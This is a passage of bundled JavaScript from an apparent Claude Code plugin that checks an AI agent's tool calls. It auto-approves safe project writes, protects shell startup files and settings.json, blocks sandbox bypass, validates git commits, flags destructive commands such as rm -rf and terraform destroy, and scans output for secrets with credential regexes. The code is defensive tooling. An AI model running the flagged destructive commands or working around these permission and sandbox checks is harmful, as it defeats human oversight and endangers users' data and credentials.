  // via the SAFE_EXTENSIONS allowlist (.toml/.yaml/.yml). Basename-anchored
  // ((?:^|\/)) so near-miss names like my-bunfig.toml keep auto-approving
  // (review !209 finding #4) — the tools only read the exact filenames.
  /(?:^|\/)bunfig\.toml$/i,
  /(?:^|\/)\.yarnrc(\.ya?ml)?$/i,
  /(?:^|\/)\.pre-commit-config\.ya?ml$/i,
  /(?:^|\/)lefthook\.ya?ml$/i,
  /(?:^|\/)\.bazelrc$/i,
  // Shell startup files — defense-in-depth: extensionless names already defer
  // via the extension allowlist, but an explicit deny is not accidental.
  /(?:^|\/)\.(zshenv|zlogin|zshrc|bash_login|bash_profile|bashrc)$/i,
  // Security control plane: settings.json governs the permission allowlist and
  // hook registration. An auto-approved write here is privilege escalation —
  // a malicious diff could grant itself arbitrary Bash auto-approval or register
  // a hook that runs on the next tool call. (Routine .claude/continuity and
  // .claude/context writes are intentionally NOT protected.)
  /\.claude\/settings(\.local)?\.json$/i
];
var SAFE_EXTENSIONS = [
  ".ts",
  ".tsx",
  ".js",
  ".jsx",
  ".py",
  ".json",
  ".yaml",
  ".yml",
  ".md",
  ".mdx",
  ".css",
  ".scss",
  ".less",
  ".html",
  ".svg",
  ".txt",
  ".sh",
  ".bash",
  ".zsh",
  ".sql",
  ".graphql",
  ".gql",
  ".toml",
  ".ini",
  ".cfg",
  ".conf",
  ".xml",
  ".vue",
  ".svelte",
  ".astro",
  ".rs",
  ".go",
  ".java",
  ".kt",
  ".swift",
  ".c",
  ".cpp",
  ".h",
  ".hpp",
  ".rb",
  ".php",
  ".pl",
  ".lua",
  ".r",
  ".R"
];
function isProtectedDirectory(normalizedPath) {
  const lower = normalizedPath.toLowerCase();
  const path27 = lower.endsWith("/") ? lower : `${lower}/`;
  return PROTECTED_DIRS.some((dir) => path27.includes(`/${dir}`) || path27.startsWith(dir));
}
function isProtectedFile(normalizedPath) {
  return PROTECTED_FILE_PATTERNS.some((pattern) => pattern.test(normalizedPath));
}
function hasSafeExtension(normalizedPath) {
  const lower = normalizedPath.toLowerCase();
  return SAFE_EXTENSIONS.some((ext) => lower.endsWith(ext));
}
async function autoApproveProjectWrites(input) {
  const skipped = runGuards(input, guardWriteEdit, guardHasFilePath);
  if (skipped) return skipped;
  const toolName = getToolName(input);
  const filePath = getFilePath(input);
  logDebug(HOOK_NAME8, `Evaluating: ${filePath}`);
  const normalizedPath = normalizePath(filePath);
  const realPath = resolveRealPath(filePath);
  logDebug(HOOK_NAME8, `Normalized: ${normalizedPath}, Resolved: ${realPath}`);
  if (!isWithinProject(realPath)) {
    logDebug(HOOK_NAME8, "Outside project directory, deferring to standard flow");
    return outputSilentSuccess();
  }
  const pathsToCheck = [normalizedPath, realPath];
  if (pathsToCheck.some(isProtectedDirectory)) {
    logDebug(HOOK_NAME8, "Protected directory, deferring to standard flow");
    return outputSilentSuccess();
  }
  if (pathsToCheck.some(isProtectedFile)) {
    logDebug(HOOK_NAME8, "Protected file pattern, deferring to standard flow");
    return outputSilentSuccess();
  }
  if (!hasSafeExtension(normalizedPath)) {
    logDebug(HOOK_NAME8, "Unrecognized file type, deferring to standard flow");
    return outputSilentSuccess();
  }
  const sessionId = getSessionId(input);
  logInfo(HOOK_NAME8, `Auto-approved: safe file within project: ${filePath}`);
  logPermission("allow", `auto-approved project file: ${filePath}`, toolName, sessionId);
  return outputAllow();
}
var HOOK_NAME9 = "permission-profiles";
var profileCache = /* @__PURE__ */ new Map();
function getProfilePath(projectDir, profileName = "default") {
  return path2.join(projectDir, ".claude", "permissions", `${profileName}.json`);
}
async function loadPermissionProfile(projectDir, profileName = "default") {
  const cwd = projectDir;
  const cacheKey = `${cwd}:${profileName}`;
  if (profileCache.has(cacheKey)) {
    logDebug(HOOK_NAME9, "Using cached permission profile");
    return profileCache.get(cacheKey) || null;
  }
  let profilePath = getProfilePath(cwd, profileName);
  if (!fs6.existsSync(profilePath)) {
    const pluginRoot = process.env["CLAUDE_PLUGIN_ROOT"];
    if (pluginRoot) {
      const pluginProfilePath = getProfilePath(pluginRoot, profileName);
      if (fs6.existsSync(pluginProfilePath)) {
        logDebug(HOOK_NAME9, "Using plugin default permission profile");
        profilePath = pluginProfilePath;
      }
    }
  }
  if (!fs6.existsSync(profilePath)) {
    logDebug(HOOK_NAME9, `Permission profile not found: ${profilePath}`);
    return null;
  }
  try {
    const content = fs6.readFileSync(profilePath, "utf-8");
    const profile = JSON.parse(content);
    if (!profile.name) {
      logError(HOOK_NAME9, "Invalid permission profile: missing name");
      return null;
    }
    profileCache.set(cacheKey, profile);
    logDebug(HOOK_NAME9, `Loaded permission profile: ${profile.name}`);
    return profile;
  } catch (error) {
    logError(HOOK_NAME9, `Failed to load permission profile: ${error}`);
    return null;
  }
}
function patternToRegex(pattern, projectDir) {
  let regexStr = pattern.replace(/\$PROJECT/g, "<<<PROJECT>>>");
  regexStr = regexStr.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*\*/g, "<<<GLOBSTAR>>>").replace(/\*/g, "[^/]*").replace(/<<<GLOBSTAR>>>\//g, "(?:.*\\/)?").replace(/\/<<<GLOBSTAR>>>/g, "(?:\\/.*)?").replace(/<<<GLOBSTAR>>>/g, ".*");
  const escapedProjectDir = projectDir.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  regexStr = regexStr.replace(/<<<PROJECT>>>/g, () => escapedProjectDir);
  return new RegExp(`^${regexStr}$`);
}
function matchesPathPattern(filePath, patterns, projectDir) {
  if (!filePath || !patterns || patterns.length === 0) {
    return false;
  }
  const normalizedPath = path2.resolve(filePath);
  for (const pattern of patterns) {
    const regex = patternToRegex(pattern, projectDir);
    if (regex.test(normalizedPath)) {
      logDebug(HOOK_NAME9, `Path '${filePath}' matches pattern '${pattern}'`);
      return true;
    }
  }
  return false;
}
function matchesCommandPattern(command, prefixes) {
  if (!command || !prefixes || prefixes.length === 0) {
    return false;
  }
  const trimmedCommand = command.trim();
  for (const prefix of prefixes) {
    if (trimmedCommand.startsWith(prefix) || trimmedCommand.includes(` ${prefix}`)) {
      logDebug(HOOK_NAME9, `Command matches prefix '${prefix}'`);
      return true;
    }
  }
  return false;
}
function matchesToolPattern(toolName, tools) {
  if (!toolName || !tools || tools.length === 0) {
    return false;
  }
  return tools.includes(toolName);
}
function checkRulesMatch(rules, toolName, filePath, command, project) {
  if (!rules) {
    return false;
  }
  if (rules.tools && matchesToolPattern(toolName, rules.tools)) {
    return true;
  }
  if (filePath && rules.paths && matchesPathPattern(filePath, rules.paths, project)) {
    return true;
  }
  if (command && rules.commands && matchesCommandPattern(command, rules.commands)) {
    return true;
  }
  return false;
}
function evaluatePermission(profile, toolName, filePath, command, projectDir) {
  const project = projectDir;
  if (checkRulesMatch(profile.deny, toolName, filePath, command, project)) {
    logDebug(HOOK_NAME9, "Permission denied: matches deny rule");
    return "deny";
  }
  if (checkRulesMatch(profile.require_approval, toolName, filePath, command, project)) {
    logDebug(HOOK_NAME9, "Permission requires approval: matches require_approval rule");
    return "require_approval";
  }
  if (checkRulesMatch(profile.auto_approve, toolName, filePath, command, project)) {
    logDebug(HOOK_NAME9, "Permission allowed: matches auto_approve rule");
    return "allow";
  }
  logDebug(HOOK_NAME9, "No permission rule matched, deferring");
  return null;
}

// src/permission/profile-evaluator.ts
var HOOK_NAME10 = "profile-evaluator";
async function profileEvaluator(input) {
  const toolName = getToolName(input);
  const filePath = getFilePath(input);
  const rawCommand = getCommand(input);
  const command = rawCommand ? stripProxyPrefix(rawCommand) : rawCommand;
  const sessionId = getSessionId(input);
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  logDebug(HOOK_NAME10, `Evaluating ${toolName} with profile`);
  const profile = await loadPermissionProfile(projectDir);
  if (!profile) {
    logDebug(HOOK_NAME10, "No permission profile found, deferring");
    return outputSilentSuccess();
  }
  const decision = evaluatePermission(profile, toolName, filePath, command, projectDir);
  switch (decision) {
    case "deny": {
      const target = filePath || command || toolName;
      logPermission("deny", `Profile denied: ${target}`, toolName, sessionId);
      logInfo(HOOK_NAME10, `Denied by profile: ${target}`);
      return outputDeny(`Operation denied by permission profile: ${target}`);
    }
    case "require_approval": {
      logDebug(HOOK_NAME10, "Requires approval per profile, deferring to standard flow");
      return outputSilentSuccess();
    }
    case "allow": {
      const target = filePath || command || toolName;
      logPermission("allow", `Profile approved: ${target}`, toolName, sessionId);
      logInfo(HOOK_NAME10, `Allowed by profile: ${target}`);
      return outputAllow();
    }
    default:
      logDebug(HOOK_NAME10, "No profile rule matched, deferring");
      return outputSilentSuccess();
  }
}

// src/permission/permission-request-combined.ts
var HOOK_NAME11 = "permission-request-combined";
function patchHookEventName(result) {
  if (result.hookSpecificOutput?.hookEventName === "PreToolUse") {
    return {
      ...result,
      hookSpecificOutput: {
        ...result.hookSpecificOutput,
        hookEventName: "PermissionRequest"
      }
    };
  }
  return result;
}
function isAllowDecision(result) {
  return result.continue === true && result.hookSpecificOutput?.permissionDecision === "allow";
}
function isDenyDecision(result) {
  return result.continue === false;
}
async function permissionRequestCombined(input) {
  const toolName = getToolName(input);
  logDebug(HOOK_NAME11, `Evaluating permission request for ${toolName}`);
  if (toolName === "Bash") {
    logDebug(HOOK_NAME11, "Running: auto-approve-safe-bash");
    const safeBashResult = await autoApproveSafeBash(input);
    if (isAllowDecision(safeBashResult)) {
      logInfo(HOOK_NAME11, "Auto-approved by safe-bash check");
      return patchHookEventName(safeBashResult);
    }
  }
  if (toolName === "Write" || toolName === "Edit" || toolName === "MultiEdit") {
    logDebug(HOOK_NAME11, "Running: auto-approve-project-writes");
    const writeResult = await autoApproveProjectWrites(input);
    if (isAllowDecision(writeResult)) {
      logInfo(HOOK_NAME11, "Auto-approved by project-writes check");
      return patchHookEventName(writeResult);
    }
  }
  logDebug(HOOK_NAME11, "Running: profile-evaluator");
  const profileResult = await profileEvaluator(input);
  if (isAllowDecision(profileResult)) {
    logInfo(HOOK_NAME11, "Allowed by profile");
    return patchHookEventName(profileResult);
  }
  if (isDenyDecision(profileResult)) {
    logInfo(HOOK_NAME11, "Denied by profile");
    return patchHookEventName(profileResult);
  }
  logDebug(HOOK_NAME11, "No decision, deferring to permission dialog");
  return outputSilentSuccess();
}
var HOOK_NAME12 = "git-validators";
var VALID_BRANCH_PATTERNS = [
  /^NAPP-\d{4,}-[\w-]+$/i,
  // Jira ticket format
  /^[A-Z]+-\d+-[\w-]+$/i,
  // Generic JIRA format
  /^feature\/.+$/,
  /^fix\/.+$/,
  /^bugfix\/.+$/,
  /^chore\/.+$/,
  /^docs\/.+$/,
  /^refactor\/.+$/,
  /^test\/.+$/,
  /^hotfix\/.+$/,
  /^release\/.+$/,
  /^dev\/.+$/i
  // Developer prefixed branches
];
var ALWAYS_VALID_BRANCHES = /* @__PURE__ */ new Set([
  "main",
  "master",
  "develop",
  "dev",
  "HEAD"
]);
var branchPatternsCache = /* @__PURE__ */ new Map();
function getBranchPatternsPath(projectDir) {
  return path2.join(projectDir, ".claude", "rules", "branch-patterns.json");
}
var MAX_BRANCH_PATTERN_LENGTH = 256;
function patternStringToRegex(pattern) {
  if (pattern.length > MAX_BRANCH_PATTERN_LENGTH) {
    throw new Error(
      `Branch pattern exceeds ${MAX_BRANCH_PATTERN_LENGTH} chars (got ${pattern.length}); shorten the pattern or split it into multiple entries.`
    );
  }
  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&");
  const regexStr = escaped.replace(/\*/g, ".+");
  return new RegExp(`^${regexStr}$`);
}
function loadBranchPatterns(projectDir) {
  const cwd = process.env["CLAUDE_PROJECT_DIR"] || ".";
  if (branchPatternsCache.has(cwd)) {
    logDebug(HOOK_NAME12, "Using cached branch patterns");
    return branchPatternsCache.get(cwd) || null;
  }
  const patternsPath = getBranchPatternsPath(cwd);
  if (!fs6.existsSync(patternsPath)) {
    logDebug(HOOK_NAME12, `Branch patterns file not found: ${patternsPath}`);
    return null;
  }
  try {
    const content = fs6.readFileSync(patternsPath, "utf-8");
    const config = JSON.parse(content);
    branchPatternsCache.set(cwd, config);
    logDebug(
      HOOK_NAME12,
      `Loaded ${config.additional_patterns?.length ?? 0} additional branch patterns`
    );
    return config;
  } catch (error) {
    logError(HOOK_NAME12, `Failed to load branch patterns: ${error}`);
    return null;
  }
}
var COMMIT_TYPES = [
  "feat",
  // New feature
  "fix",
  // Bug fix
  "docs",
  // Documentation
  "style",
  // Formatting, no code change
  "refactor",
  // Code change without feature/fix
  "perf",
  // Performance improvement
  "test",
  // Adding tests
  "build",
  // Build system changes
  "ci",
  // CI configuration
  "chore",
  // Other changes
  "revert"
  // Revert previous commit
];
var CONVENTIONAL_COMMIT_PATTERN = /^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([^)]+\))?: .{3,}/;
var MERGE_COMMIT_PATTERNS = [
  /^Merge (branch|pull request|remote-tracking branch)/i,
  /^Merge '.+' into /i,
  /^Merged /i
];
var REVERT_COMMIT_PATTERNS = [/^Revert ".*"$/i, /^Revert:/i];
function validateBranchName(branch, projectDir) {
  if (!branch) {
    return {
      valid: false,
      error: "Branch name is empty"
    };
  }
  if (ALWAYS_VALID_BRANCHES.has(branch)) {
    return { valid: true };
  }
  const config = loadBranchPatterns();
  const additionalPatterns = [];
  for (const raw of config?.additional_patterns ?? []) {
    try {
      additionalPatterns.push(patternStringToRegex(raw));
    } catch (error) {
      logError(HOOK_NAME12, `Skipping invalid branch pattern: ${error}`);
    }
  }
  const allPatterns = [...VALID_BRANCH_PATTERNS, ...additionalPatterns];
  for (const pattern of allPatterns) {
    if (pattern.test(branch)) {
      logDebug(HOOK_NAME12, `Branch '${branch}' matches pattern ${pattern}`);
      return { valid: true };
    }
  }
  return {
    valid: false,
    error: `Branch name '${branch}' doesn't follow naming conventions`,
    suggestion: "Use: NAPP-1234-description, feature/name, fix/name, chore/name, or developer-prefix/name"
  };
}
function validateCommitMessage(message) {
  if (!message) {
    return {
      valid: false,
      error: "Commit message is empty"
    };
  }
  const firstLine = message.split("\n")[0]?.trim() ?? "";
  if (!firstLine) {
    return {
      valid: false,
      error: "Commit message subject line is empty"
    };
  }
  for (const pattern of MERGE_COMMIT_PATTERNS) {
    if (pattern.test(firstLine)) {
      return { valid: true };
    }
  }
  for (const pattern of REVERT_COMMIT_PATTERNS) {
    if (pattern.test(firstLine)) {
      return { valid: true };
    }
  }
  if (CONVENTIONAL_COMMIT_PATTERN.test(firstLine)) {
    logDebug(HOOK_NAME12, "Commit message follows conventional format");
    return { valid: true };
  }
  if (firstLine.length < 10) {
    return {
      valid: false,
      error: "Commit message is too short (minimum 10 characters)",
      suggestion: "Write a descriptive commit message explaining what and why"
    };
  }
  return {
    valid: false,
    error: "Commit message doesn't follow conventional commit format",
    suggestion: `Use: ${COMMIT_TYPES.join("|")}(scope): description
Example: feat(auth): add OAuth2 login support`
  };
}
function extractCommitMessageFromCommand(command) {
  if (!command) {
    return null;
  }
  const shortFlagPattern = /-m\s+(?:"([^"]+)"|'([^']+)')/;
  const shortMatch = shortFlagPattern.exec(command);
  if (shortMatch) {
    return shortMatch[1] || shortMatch[2] || null;
  }
  const longFlagPattern = /--message=(?:"([^"]+)"|'([^']+)')/;
  const longMatch = longFlagPattern.exec(command);
  if (longMatch) {
    return longMatch[1] || longMatch[2] || null;
  }
  const noQuotesPattern = /-m\s+([^\s]+)/;
  const noQuotesMatch = noQuotesPattern.exec(command);
  if (noQuotesMatch) {
    return noQuotesMatch[1] || null;
  }
  return null;
}
function isGitCommitCommand(command) {
  if (!command) {
    return false;
  }
  return /(?:^|&&\s*|;\s*)git\s+commit\b/.test(command);
}
function isAmendCommit(command) {
  if (!command) {
    return false;
  }
  return /git\s+commit\s+.*--amend/.test(command);
}

// src/pretool/git-validator.ts
var HOOK_NAME13 = "git-validator";
function validateMessage(command) {
  const message = extractCommitMessageFromCommand(command);
  if (!message) {
    return null;
  }
  const validation = validateCommitMessage(message);
  if (validation.valid) {
    return null;
  }
  logInfo(HOOK_NAME13, `Invalid commit message: ${validation.error}`);
  const suggestion = validation.suggestion ? ` (${validation.suggestion})` : "";
  return `Commit message: ${validation.error}${suggestion}`;
}
function checkBranch() {
  const warnings = [];
  const currentBranch = getCachedBranch();
  if (!currentBranch) {
    return warnings;
  }
  if (isProtectedBranch(currentBranch)) {
    logWarn(HOOK_NAME13, `Committing to protected branch: ${currentBranch}`);
    warnings.push(
      `Committing directly to protected branch '${currentBranch}'. Consider using a feature branch.`
    );
    return warnings;
  }
  const validation = validateBranchName(currentBranch);
  if (!validation.valid) {
    logInfo(HOOK_NAME13, `Invalid branch name: ${validation.error}`);
    const suggestion = validation.suggestion ? ` (${validation.suggestion})` : "";
    warnings.push(`Branch: ${validation.error}${suggestion}`);
  }
  return warnings;
}
async function gitValidator(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const command = stripProxyPrefix(getCommand(input));
  if (!isGitCommitCommand(command)) {
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME13, `Validating git commit: ${command.slice(0, 80)}...`);
  const warnings = [];
  if (!isAmendCommit(command)) {
    const messageWarning = validateMessage(command);
    if (messageWarning) {
      warnings.push(messageWarning);
    }
  }
  warnings.push(...checkBranch());
  if (warnings.length > 0) {
    logInfo(HOOK_NAME13, `Git validation warnings: ${warnings.length}`);
    return outputWarning(warnings.join("\n"));
  }
  logDebug(HOOK_NAME13, "Git commit validation passed");
  return outputSilentSuccess();
}

// src/pretool/bash-combined.ts
var HOOK_NAME14 = "bash-combined";
function isAllowDecision2(result) {
  return result.continue === true && result.hookSpecificOutput?.permissionDecision === "allow";
}
function isDenyDecision2(result) {
  return result.continue === false;
}
function isWarning(result) {
  return result.continue === true && result.systemMessage !== void 0;
}
function isBlockingDecision(result) {
  return isDenyDecision2(result) || result.hookSpecificOutput?.permissionDecision === "ask";
}
async function bashCombined(input) {
  const skipped = runGuards(input, guardBash);
  if (skipped) return skipped;
  if (input.tool_input?.dangerouslyDisableSandbox === true) {
    logWarn(HOOK_NAME14, "Blocked: dangerouslyDisableSandbox=true");
    return outputDeny("Sandbox bypass is not allowed by plugin security policy");
  }
  logDebug(HOOK_NAME14, "Starting combined Bash validation");
  const warnings = [];
  logDebug(HOOK_NAME14, "Running: security-blocker");
  const securityResult = await securityBlocker(input);
  if (isBlockingDecision(securityResult)) {
    logInfo(HOOK_NAME14, "Blocked/gated by security check");
    return securityResult;
  }
  logDebug(HOOK_NAME14, "Running: git-validator");
  const gitResult = await gitValidator(input);
  if (isWarning(gitResult)) {
    const warningMsg = gitResult.systemMessage?.replace(/^⚠ /, "") || "";
    if (warningMsg) {
      warnings.push(warningMsg);
    }
  }
  logDebug(HOOK_NAME14, "Running: auto-approve-safe-bash");
  const safeBashResult = await autoApproveSafeBash(input);
  if (isAllowDecision2(safeBashResult)) {
    logInfo(HOOK_NAME14, "Auto-approved by safe-bash check");
    return safeBashResult;
  }
  logDebug(HOOK_NAME14, "Running: profile-evaluator");
  const profileResult = await profileEvaluator(input);
  if (isAllowDecision2(profileResult)) {
    logInfo(HOOK_NAME14, "Allowed by profile");
    return profileResult;
  }
  if (isDenyDecision2(profileResult)) {
    logInfo(HOOK_NAME14, "Denied by profile");
    return profileResult;
  }
  const rawCommand = getCommand(input);
  const command = rawCommand ? stripProxyPrefix(rawCommand) : rawCommand;
  if (command && /^npm\s+(install|ci|i)\b/.test(command)) {
    warnings.push(
      "npm install detected \u2014 consider running `npm audit` after install to check for vulnerabilities."
    );
    logDebug(HOOK_NAME14, "npm install detected, advisory added");
  }
  if (warnings.length > 0) {
    logInfo(HOOK_NAME14, `Deferring with ${warnings.length} warning(s)`);
    const userMsg = `\u26A0 ${warnings.length} git warning(s)`;
    const claudeCtx = warnings.join("\n");
    return outputWithNotification(userMsg, claudeCtx, "PreToolUse");
  }
  logDebug(HOOK_NAME14, "No decision, deferring to standard flow");
  return outputSilentSuccess();
}
var HOOK_NAME15 = "preflight-context-injector";
var DESTRUCTIVE_PATTERNS = [
  /\bgit\s+commit\b/,
  /\bgit\s+push\b/,
  /\bterraform\s+apply\b/,
  /\bterraform\s+destroy\b/,
  /\brm\s+-[rf][rf]?\b/
];
function isDestructiveCommand(command) {
  return DESTRUCTIVE_PATTERNS.some((p) => p.test(command));
}
function getWorkingDir() {
  return process.env["CLAUDE_PROJECT_DIR"] || process.cwd();
}
function getRemoteUrl(projectDir) {
  try {
    return execSync("git remote get-url origin", {
      cwd: projectDir,
      encoding: "utf-8",
      timeout: 3e3,
      stdio: ["pipe", "pipe", "pipe"]
    }).trim();
  } catch {
    return "";
  }
}
function getWorktrees(projectDir) {
  try {
    const out = execSync("git worktree list", {
      cwd: projectDir,
      encoding: "utf-8",
      timeout: 3e3,
      stdio: ["pipe", "pipe", "pipe"]
    }).trim();
    if (!out) return [];
    return out.split("\n").filter((line) => line.length > 0);
  } catch {
    return [];
  }
}
function buildPreflightContext(command, projectDir) {
  if (!isDestructiveCommand(command)) {
    return null;
  }
  const cwd = getWorkingDir();
  const branch = getCachedBranch(cwd) || "(detached or not a git repo)";
  const remote = getRemoteUrl(cwd) || "(no remote configured)";
  const worktrees = getWorktrees(cwd);
  const lines = [
    "Preflight context for upcoming destructive command:",
    `  pwd: ${cwd}`,
    `  branch: ${branch}`,
    `  remote: ${remote}`
  ];
  if (worktrees.length > 1) {
    lines.push("  worktrees:");
    for (const w of worktrees) {
      lines.push(`    ${w}`);
    }
  }
  lines.push("Verify pwd/branch/remote match the intended target before proceeding.");
  return lines.join("\n");
}
async function preflightContextInjector(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const command = getCommand(input);
  const context = buildPreflightContext(command);
  if (!context) {
    logDebug(HOOK_NAME15, "Non-destructive command, no context injected");
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME15, "Destructive command detected, injecting preflight context");
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      additionalContext: context
    }
  };
}

// src/posttool/secret-detector.ts
var HOOK_NAME16 = "secret-detector";
var MAX_OUTPUT_SIZE = 50 * 1024;
var SECRET_PATTERNS = [
  // AWS Access Key ID (starts with AKIA, exactly 20 chars)
  { type: "AWS Access Key ID", pattern: /AKIA[0-9A-Z]{16}/ },
  // AWS Secret Access Key (40-char base64 after known key name)
  {
    type: "AWS Secret Access Key",
    pattern: /(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*[A-Za-z0-9/+=]{40}/
  },
  // AWS Session Token (long base64 after known key name, for STS/Bedrock)
  {
    type: "AWS Session Token",
    pattern: /(?:aws_session_token|AWS_SESSION_TOKEN)\s*[=:]\s*[A-Za-z0-9/+=]{100,}/
  },
  // Anthropic API Key
  { type: "Anthropic API Key", pattern: /sk-ant-[A-Za-z0-9_-]{20,}/ },
  // Private Key block — optional " BLOCK" suffix covers PGP armor headers
  // ("-----BEGIN PGP PRIVATE KEY BLOCK-----"), which the bare suffix missed
  { type: "Private Key", pattern: /-----BEGIN [A-Z ]*PRIVATE KEY(?: BLOCK)?-----/ },
  // JWT Token (three base64url segments)
  {
    type: "JWT Token",
    pattern: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/
  },
  // Database connection string with credentials
  {
    type: "Database Connection String",
    pattern: /(?:postgresql|mysql|mongodb|redis|amqp):\/\/[^:\s]+:[^@\s]+@/
  },
  // Bearer token (20+ char minimum)
  { type: "Bearer Token", pattern: /Bearer\s+[A-Za-z0-9_\-.]{20,}/ },
  // Secret key-value pairs (known key names with 8+ char values).
  // Accepts bare AND quoted values — `password="…"` is the dominant real
  // form in config files and previously escaped the bare-value pattern.
  // Quoted values stay whitespace-free so prose ("use a strong password
  // here" in docs) cannot trip the hard pre-write gate.
  {
    type: "Secret Key-Value",
    pattern: /(?:password|secret|api_key|apikey|api_secret|access_token|auth_token|private_key|secret_key)\s*[=:]\s*(?:"[^"\s]{8,}"|'[^'\s]{8,}'|[^\s'"]{8,})/i
  },
  // GitHub Token (ghp_, gho_, ghu_, ghs_, ghr_)
  { type: "GitHub Token", pattern: /gh[pousr]_[A-Za-z0-9_]{36,}/ },
  // GitHub fine-grained PAT (github_pat_ prefix, introduced 2022)
  { type: "GitHub Fine-Grained Token", pattern: /github_pat_[A-Za-z0-9_]{22,}/ },
  // GitLab Personal/Project/Group Access Token
  { type: "GitLab Token", pattern: /glpat-[A-Za-z0-9_-]{20,}/ },
  // Slack Token
  { type: "Slack Token", pattern: /xox[bpsa]-[A-Za-z0-9-]{20,}/ },
  // Slack App-Level Token
  { type: "Slack App Token", pattern: /xapp-[A-Za-z0-9-]{20,}/ },
  // OpenAI API Key (sk- prefix, but not sk-ant- which is Anthropic)
  { type: "OpenAI API Key", pattern: /sk-(?!ant-)[A-Za-z0-9]{20,}/ },
  // OpenAI project-scoped key — hyphenated, so the legacy sk- pattern
  // (alphanumeric-only) never matched it
  { type: "OpenAI Project Key", pattern: /sk-proj-[A-Za-z0-9_-]{20,}/ }
];
var EXAMPLE_SECRET_ALLOWLIST = [
  // AWS canonical documentation access keys (docs.aws.amazon.com)
  `AKIA${"IOSFODNN7EXAMPLE"}`,
  `AKIA${"I44QH8DHBEXAMPLE"}`,
  // AWS canonical documentation secret key
  `wJalrXUtnFEMI/K7MDENG/${"bPxRfiCYEXAMPLEKEY"}`
];
function stripExampleSecrets(text) {
  let out = text;
  for (const example of EXAMPLE_SECRET_ALLOWLIST) {
    if (out.includes(example)) {
      out = out.split(example).join("EXAMPLE");
    }
  }
  return out;
}
function scanForSecrets(text) {
  const secretTypes = [];
  const sanitized = stripExampleSecrets(text);
  for (const { type, pattern } of SECRET_PATTERNS) {
    if (pattern.test(sanitized)) {
      secretTypes.push(type);
    }
  }
  return {
    detected: secretTypes.length > 0,
    secretTypes
  };
}
async function secretDetector(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const extendedInput = input;
  const toolOutput = extendedInput.tool_output;
  if (!toolOutput) {
    logDebug(HOOK_NAME16, "No tool output available");
    return outputSilentSuccess();
  }
  const outputText = [toolOutput.stdout, toolOutput.stderr, toolOutput.output].filter(Boolean).join("\n");
  if (!outputText) {
    logDebug(HOOK_NAME16, "Empty output, skipping");
    return outputSilentSuccess();
  }
  if (outputText.length > MAX_OUTPUT_SIZE) {
    logDebug(HOOK_NAME16, `Output too large (${outputText.length} bytes), skipping`);
    return outputSilentSuccess();
  }
  const result = scanForSecrets(outputText);
  if (!result.detected) {
    logDebug(HOOK_NAME16, "No secrets detected");
    return outputSilentSuccess();
  }
  const typesStr = result.secretTypes.join(", ");
  logWarn(HOOK_NAME16, `Secrets detected in output: ${typesStr}`);
  const userMsg = `\u26A0 Potential secrets detected in command output: ${typesStr}. Review output carefully before sharing.`;
  const claudeCtx = `SECURITY WARNING: The command output contains potential secrets (${typesStr}). DO NOT repeat, echo, or include these secret values in your responses. If you need to reference them, describe what they are without showing the actual values.`;
  logInfo(HOOK_NAME16, `Warning issued for: ${typesStr}`);
  return outputWithNotification(userMsg, claudeCtx);
}

// src/pretool/write-combined.ts
var HOOK_NAME17 = "write-combined";
var ARCHITECTURE_FILES = [
  { pattern: /tsconfig\.json$/, category: "TypeScript config" },
  { pattern: /package\.json$/, category: "package manifest" },
  { pattern: /Dockerfile/, category: "Docker config" },
  { pattern: /docker-compose/, category: "Docker Compose" },
  { pattern: /\.gitlab-ci\.yml$/, category: "CI/CD pipeline" },
  { pattern: /\.github\/workflows\//, category: "GitHub Actions" },
  { pattern: /terraform\.tfvars$/, category: "Terraform variables" },
  { pattern: /\.tf$/, category: "Terraform config" },
  { pattern: /alembic\.ini$/, category: "Alembic config" },
  { pattern: /biome\.json$/, category: "Biome config" },
  { pattern: /\.eslintrc/, category: "ESLint config" },
  { pattern: /vitest\.config/, category: "Vitest config" },
  { pattern: /jest\.config/, category: "Jest config" }
];
function isAllowDecision3(result) {
  return result.continue === true && result.hookSpecificOutput?.permissionDecision === "allow";
}
function isDenyDecision3(result) {
  return result.continue === false;
}
function gatherWriteContent(input) {
  const parts = [];
  const content = getContent(input);
  if (content) parts.push(content);
  const newStr = getNewString(input);
  if (newStr) parts.push(newStr);
  const edits = input.tool_input?.edits;
  if (Array.isArray(edits)) {
    for (const e of edits) {
      if (e && typeof e.new_string === "string") parts.push(e.new_string);
    }
  }
  return parts.join("\n");
}
async function writeCombined(input) {
  const skipped = runGuards(input, guardWriteEdit);
  if (skipped) return skipped;
  logDebug(HOOK_NAME17, "Starting combined Write/Edit validation");
  logDebug(HOOK_NAME17, "Running: security-blocker");
  const securityResult = await securityBlocker(input);
  if (isDenyDecision3(securityResult)) {
    logInfo(HOOK_NAME17, "Blocked by security check");
    return securityResult;
  }
  const contentToScan = gatherWriteContent(input);
  if (contentToScan) {
    logDebug(HOOK_NAME17, "Running: pre-write-secret-scan");
    const scan = scanForSecrets(contentToScan);
    if (scan.detected) {
      const types = scan.secretTypes.join(", ");
      logWarn(HOOK_NAME17, `BLOCKED: secrets detected in write content: ${types}`);
      return outputDeny(
        `Blocked: content contains potential secrets (${types}). Use environment variables or a secrets manager instead of hardcoding credentials.`
      );
    }
  }
  logDebug(HOOK_NAME17, "Running: auto-approve-project-writes");
  const projectWriteResult = await autoApproveProjectWrites(input);
  if (isAllowDecision3(projectWriteResult)) {
    logInfo(HOOK_NAME17, "Auto-approved by project-writes check");
    return projectWriteResult;
  }
  logDebug(HOOK_NAME17, "Running: profile-evaluator");
  const profileResult = await profileEvaluator(input);
  if (isAllowDecision3(profileResult)) {
    logInfo(HOOK_NAME17, "Allowed by profile");
    return profileResult;
  }
